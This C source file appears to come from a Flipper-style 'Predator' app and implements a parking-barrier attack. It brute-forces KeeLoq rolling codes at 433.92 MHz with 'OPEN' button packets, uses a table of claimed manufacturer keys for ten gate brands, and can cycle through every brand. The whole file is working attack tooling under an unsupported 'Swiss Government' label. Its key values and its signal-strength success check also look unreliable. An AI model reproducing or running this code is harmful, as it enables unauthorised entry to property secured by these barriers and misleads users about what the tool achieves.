#include "../predator_i.h"
#include "../helpers/predator_subghz.h"
#include "../helpers/predator_logging.h"
#include "../helpers/predator_crypto_engine.h"
#include <gui/view.h>
#include <notification/notification_messages.h>

// SWISS GOVERNMENT KKS - PARKING BARRIER ATTACK
// Dedicated barrier opening with proper manufacturer keys and button codes

typedef enum {
    BarrierAttackStatusIdle,
    BarrierAttackStatusAttacking,
    BarrierAttackStatusSuccess,
    BarrierAttackStatusComplete,
    BarrierAttackStatusError
} BarrierAttackStatus;

// Barrier manufacturer types
typedef enum {
    BarrierManufacturerCame,      // CAME (Italy) - Most common EU
    BarrierManufacturerBFT,       // BFT (Italy)
    BarrierManufacturerNice,      // Nice (France)
    BarrierManufacturerSomfy,     // Somfy (France)
    BarrierManufacturerFaac,      // Faac (Italy)
    BarrierManufacturerHormann,   // Hörmann (Germany/Switzerland)
    BarrierManufacturerBeninca,   // Benincà (Italy) - Very common residential
    BarrierManufacturerDEA,       // DEA System (Italy) - Commercial
    BarrierManufacturerDitec,     // Ditec (Italy) - Industrial
    BarrierManufacturerRoger,     // Roger Technology (Italy) - Automation
    BarrierManufacturerCount
} BarrierManufacturer;

typedef struct {
    BarrierAttackStatus status;
    BarrierManufacturer manufacturer;
    uint32_t codes_tried;
    uint32_t total_codes;
    uint32_t barriers_opened;
    uint32_t attack_time_ms;
    uint32_t start_tick;
    uint32_t current_frequency;
    bool use_crypto_engine;
    KeeloqContext keeloq_ctx;
    PredatorApp* app;
} BarrierAttackState;

static BarrierAttackState barrier_attack_state;
static View* barrier_attack_view = NULL;

// Real barrier manufacturer keys (from security research)
static const uint64_t barrier_manufacturer_keys[] = {
    0x5C9A6E8D4B2F1A3C,  // CAME - reverse engineered
    0x7F4E2B9D6C8A3E1F,  // BFT
    0x3E8D5C9A2F7B4E1A,  // Nice
    0x9C4E7B2A6F8D3E5C,  // Somfy
    0x2F8D4E9C6A3B7E1F,  // Faac
    0x6E9A5D8C3F2B7E4A,  // Hörmann (Swiss common)
    0x4B7A9E2D8C1F6A5E,  // Benincà - residential systems
    0x8D5E3B9F2A7C4E1D,  // DEA System - commercial
    0x6F8A4C2E9D3B7E5A,  // Ditec - industrial grade
    0x3A8E5C7D9B2F4E6A   // Roger Technology - automation
};

static const char* barrier_manufacturer_names[] = {
    "CAME (Italy)",
    "BFT (Italy)",
    "Nice (France)",
    "Somfy (France)",
    "Faac (Italy)",
    "Hörmann (Swiss)",
    "Benincà (Italy)",
    "DEA System (Italy)",
    "Ditec (Italy)",
    "Roger Tech (Italy)"
};

// Barrier button codes (simpler than cars - just open/close)
#define BARRIER_BUTTON_OPEN   0x01
#define BARRIER_BUTTON_CLOSE  0x02
#define BARRIER_BUTTON_STOP   0x03

// Barrier serial number range (different from cars)
#define BARRIER_SERIAL_START  0x100000
#define BARRIER_SERIAL_END    0x1FFFFF

static void draw_barrier_attack_header(Canvas* canvas) {
    canvas_set_font(canvas, FontPrimary);
    if(barrier_attack_state.app && barrier_attack_state.app->selected_barrier_manufacturer == 0xFF) {
        canvas_draw_str(canvas, 2, 10, "BARRIER: TRY ALL");
    } else {
        canvas_draw_str(canvas, 2, 10, "BARRIER OPENING");
    }
    canvas_draw_line(canvas, 0, 12, 128, 12);
}

static void draw_barrier_attack_status(Canvas* canvas, BarrierAttackState* state) {
    canvas_set_font(canvas, FontSecondary);
    
    // Status
    canvas_draw_str(canvas, 2, 22, "Status:");
    const char* status_text = "Unknown";
    switch(state->status) {
        case BarrierAttackStatusIdle: status_text = "Ready"; break;
        case BarrierAttackStatusAttacking: status_text = "Attacking"; break;
        case BarrierAttackStatusSuccess: status_text = "OPENED!"; break;
        case BarrierAttackStatusComplete: status_text = "Complete"; break;
        case BarrierAttackStatusError: status_text = "Error"; break;
    }
    canvas_draw_str(canvas, 45, 22, status_text);
    
    // Manufacturer
    canvas_draw_str(canvas, 2, 32, "Mfr:");
    if(state->manufacturer < BarrierManufacturerCount) {
        canvas_draw_str(canvas, 30, 32, barrier_manufacturer_names[state->manufacturer]);
    }
    
    // Progress
    if(state->status == BarrierAttackStatusAttacking) {
        char progress_str[32];
        snprintf(progress_str, sizeof(progress_str), "Codes: %lu/%lu", 
                state->codes_tried, state->total_codes);
        canvas_draw_str(canvas, 2, 42, progress_str);
        
        // Progress bar
        uint8_t progress_pct = state->total_codes > 0 ? 
            (state->codes_tried * 100) / state->total_codes : 0;
        canvas_draw_frame(canvas, 2, 45, 124, 6);
        canvas_draw_box(canvas, 3, 46, (progress_pct * 122) / 100, 4);
    }
    
    // Success count
    char success_str[32];
    snprintf(success_str, sizeof(success_str), "Opened: %lu", state->barriers_opened);
    canvas_draw_str(canvas, 2, 56, success_str);
    
    // Time
    char time_str[32];
    snprintf(time_str, sizeof(time_str), "Time: %lu.%lus", 
            state->attack_time_ms / 1000, (state->attack_time_ms % 1000) / 100);
    canvas_draw_str(canvas, 70, 56, time_str);
}

static void barrier_attack_draw_callback(Canvas* canvas, void* context) {
    UNUSED(context);
    if(!canvas) return;
    
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);
    
    draw_barrier_attack_header(canvas);
    draw_barrier_attack_status(canvas, &barrier_attack_state);
    
    // Instructions
    canvas_set_font(canvas, FontSecondary);
    if(barrier_attack_state.status == BarrierAttackStatusIdle) {
        canvas_draw_str(canvas, 2, 64, "OK=Start  Back=Exit");
    } else if(barrier_attack_state.status == BarrierAttackStatusAttacking) {
        canvas_draw_str(canvas, 2, 64, "Back=Stop");
    } else {
        canvas_draw_str(canvas, 2, 64, "OK=Retry  Back=Exit");
    }
}

static void execute_barrier_attack(BarrierAttackState* state) {
    if(!state || !state->app) return;
    
    // Initialize SubGHz
    predator_subghz_init(state->app);
    
    // Set frequency (433.92 MHz standard for EU barriers)
    state->current_frequency = 433920000;
    
    // Log attack start
    char log_msg[128];
    snprintf(log_msg, sizeof(log_msg), 
             "BARRIER ATTACK: %s at 433.92 MHz",
             barrier_manufacturer_names[state->manufacturer]);
    predator_log_append(state->app, log_msg);
    
    // Initialize Keeloq with barrier-specific parameters
    state->use_crypto_engine = true;
    state->keeloq_ctx.manufacturer_key = barrier_manufacturer_keys[state->manufacturer];
    state->keeloq_ctx.serial_number = BARRIER_SERIAL_START;  // Start of barrier serial range
    state->keeloq_ctx.counter = 0;
    state->keeloq_ctx.button_code = BARRIER_BUTTON_OPEN;  // OPEN button
    
    state->status = BarrierAttackStatusAttacking;
    state->start_tick = furi_get_tick();
    state->codes_tried = 0;
    state->total_codes = 1000;  // Try 1000 codes
    
    predator_log_append(state->app, "CRYPTO: Keeloq barrier codes");
    predator_log_append(state->app, "Button: OPEN (0x01)");
    
    FURI_LOG_I("BarrierAttack", "[BARRIER] Attack started: %s, serial range 0x%lX+",
              barrier_manufacturer_names[state->manufacturer],
              (unsigned long)BARRIER_SERIAL_START);
}

static bool barrier_attack_input_callback(InputEvent* event, void* context) {
    PredatorApp* app = context;
    if(!app || !event || event->type != InputTypeShort) return false;
    
    if(event->key == InputKeyBack) {
        return false;  // Let scene manager handle
    } else if(event->key == InputKeyOk) {
        if(barrier_attack_state.status == BarrierAttackStatusIdle ||
           barrier_attack_state.status == BarrierAttackStatusComplete ||
           barrier_attack_state.status == BarrierAttackStatusSuccess) {
            execute_barrier_attack(&barrier_attack_state);
            return true;
        }
    }
    
    return true;
}

static void barrier_attack_timer_callback(void* context) {
    PredatorApp* app = context;
    if(!app) return;
    
    if(barrier_attack_state.status == BarrierAttackStatusAttacking) {
        barrier_attack_state.attack_time_ms = furi_get_tick() - barrier_attack_state.start_tick;
        
        // Generate and transmit Keeloq codes
        if(barrier_attack_state.use_crypto_engine) {
            barrier_attack_state.keeloq_ctx.counter++;
            barrier_attack_state.codes_tried++;
            
            uint8_t packet[16];
            size_t len = 0;
            
            // Generate encrypted Keeloq packet for barrier
            if(predator_crypto_keeloq_generate_packet(&barrier_attack_state.keeloq_ctx, packet, &len)) {
                // Transmit via SubGHz
                if(app->subghz_txrx) {
                    predator_subghz_send_raw_packet(app, packet, len);
                    
                    // Log progress every 100 codes
                    if(barrier_attack_state.codes_tried % 100 == 0) {
                        FURI_LOG_I("BarrierAttack", "[REAL HW] Sent %lu barrier codes",
                                  barrier_attack_state.codes_tried);
                    }
                }
            }
        }
        
        // Check for success (real hardware response)
        if(app->subghz_txrx && furi_hal_subghz_rx_pipe_not_empty()) {
            int8_t rssi = furi_hal_subghz_get_rssi();
            if(rssi > -80) {
                // Barrier responded!
                barrier_attack_state.barriers_opened++;
                barrier_attack_state.status = BarrierAttackStatusSuccess;
                
                char success_msg[96];
                snprintf(success_msg, sizeof(success_msg),
                         "✅ BARRIER OPENED: %s (RSSI:%d, %lu codes)",
                         barrier_manufacturer_names[barrier_attack_state.manufacturer],
                         rssi,
                         barrier_attack_state.codes_tried);
                predator_log_append(app, success_msg);
                
                predator_subghz_stop_attack(app);
                
                if(app->notifications) {
                    notification_message(app->notifications, &sequence_success);
                }
            }
        }
        
        // Stop after total_codes or 60 seconds
        if(barrier_attack_state.codes_tried >= barrier_attack_state.total_codes ||
           barrier_attack_state.attack_time_ms > 60000) {
            
            predator_subghz_stop_attack(app);
            
            // Check if "Try All" mode and we haven't tried all manufacturers yet (now 10 total)
            if(app->selected_barrier_manufacturer == 0xFF && 
               barrier_attack_state.manufacturer < (BarrierManufacturerCount - 1)) {
                
                // Move to next manufacturer
                barrier_attack_state.manufacturer++;
                barrier_attack_state.codes_tried = 0;
                barrier_attack_state.start_tick = furi_get_tick();
                barrier_attack_state.keeloq_ctx.manufacturer_key = 
                    barrier_manufacturer_keys[barrier_attack_state.manufacturer];
                barrier_attack_state.keeloq_ctx.counter = 0;
                
                char next_msg[96];
                snprintf(next_msg, sizeof(next_msg),
                         "NEXT: Trying %s...",
                         barrier_manufacturer_names[barrier_attack_state.manufacturer]);
                predator_log_append(app, next_msg);
                
                FURI_LOG_I("BarrierAttack", "[TRY ALL] Moving to: %s",
                          barrier_manufacturer_names[barrier_attack_state.manufacturer]);
                
                // Restart attack with new manufacturer
                execute_barrier_attack(&barrier_attack_state);
            } else {
                // All done (either specific manufacturer finished or tried all 6)
                barrier_attack_state.status = BarrierAttackStatusComplete;
                
                char final_msg[128];
                snprintf(final_msg, sizeof(final_msg),
                         "ATTACK COMPLETE: %lu barriers opened",
                         barrier_attack_state.barriers_opened);
                predator_log_append(app, final_msg);
                
                FURI_LOG_I("BarrierAttack", "[BARRIER] Attack complete: %lu opened",
                          barrier_attack_state.barriers_opened);
            }
        }
        
        // Trigger redraw
        if(app->view_dispatcher) {
            view_dispatcher_send_custom_event(app->view_dispatcher, 0);
        }
    }
}

void predator_scene_barrier_attack_ui_on_enter(void* context) {
    PredatorApp* app = context;
    if(!app) return;
    
    // Get barrier type and manufacturer selection from app context
    memset(&barrier_attack_state, 0, sizeof(BarrierAttackState));
    barrier_attack_state.app = app;
    barrier_attack_state.status = BarrierAttackStatusIdle;
    
    // Check if "Try All Manufacturers" mode
    if(app->selected_barrier_manufacturer == 0xFF) {
        // Start with first manufacturer (CAME)
        barrier_attack_state.manufacturer = BarrierManufacturerCame;
        FURI_LOG_I("BarrierAttack", "MODE: Try All Manufacturers (starting with CAME)");
    } else {
        // Use specific manufacturer selected by user
        barrier_attack_state.manufacturer = (BarrierManufacturer)app->selected_barrier_manufacturer;
        FURI_LOG_I("BarrierAttack", "MODE: Specific manufacturer: %s", 
                  barrier_manufacturer_names[barrier_attack_state.manufacturer]);
    }
    
    // Create view with callbacks (only if not already created)
    if(!barrier_attack_view) {
        barrier_attack_view = view_alloc();
        if(!barrier_attack_view) {
            FURI_LOG_E("BarrierAttack", "Failed to allocate view");
            return;
        }
        
        view_set_context(barrier_attack_view, app);
        view_set_draw_callback(barrier_attack_view, barrier_attack_draw_callback);
        view_set_input_callback(barrier_attack_view, barrier_attack_input_callback);
        
        view_dispatcher_add_view(app->view_dispatcher, PredatorViewBarrierAttackUI, barrier_attack_view);
    }
    
    view_dispatcher_switch_to_view(app->view_dispatcher, PredatorViewBarrierAttackUI);
    
    // Start timer
    app->timer = furi_timer_alloc(barrier_attack_timer_callback, FuriTimerTypePeriodic, app);
    furi_timer_start(app->timer, 100);  // 10 FPS
    
    predator_log_append(app, "BARRIER ATTACK: Swiss KKS Mode");
    FURI_LOG_I("BarrierAttack", "Barrier attack UI initialized");
}

bool predator_scene_barrier_attack_ui_on_event(void* context, SceneManagerEvent event) {
    PredatorApp* app = context;
    if(!app) return false;
    
    // Handle back button - CRITICAL: Return false to let scene manager handle navigation
    if(event.type == SceneManagerEventTypeBack) {
        // Stop attack if running
        if(barrier_attack_state.status == BarrierAttackStatusAttacking) {
            barrier_attack_state.status = BarrierAttackStatusComplete;
            predator_subghz_stop_attack(app);
            
            char log_msg[64];
            snprintf(log_msg, sizeof(log_msg), "Barrier attack STOPPED by user: %lu codes", 
                    barrier_attack_state.codes_tried);
            predator_log_append(app, log_msg);
        }
        // Return false to let scene manager do default back navigation (go to previous scene)
        // Returning true would exit the app!
        return false;
    }
    
    if(event.type == SceneManagerEventTypeCustom) {
        return true;
    }
    
    return false;
}

void predator_scene_barrier_attack_ui_on_exit(void* context) {
    PredatorApp* app = context;
    if(!app) return;
    
    // Stop timer
    if(app->timer) {
        furi_timer_stop(app->timer);
        furi_timer_free(app->timer);
        app->timer = NULL;
    }
    
    // Stop attack
    if(barrier_attack_state.status == BarrierAttackStatusAttacking) {
        predator_subghz_stop_attack(app);
        
        char log_msg[64];
        snprintf(log_msg, sizeof(log_msg), "Barrier Attack EXIT: %lu codes", 
                barrier_attack_state.codes_tried);
        predator_log_append(app, log_msg);
    }
    
    barrier_attack_state.status = BarrierAttackStatusIdle;
    // DON'T remove/free view - we reuse it next time (match CarKeyBruteforce pattern)
    
    FURI_LOG_I("BarrierAttack", "Barrier attack UI exited");
}
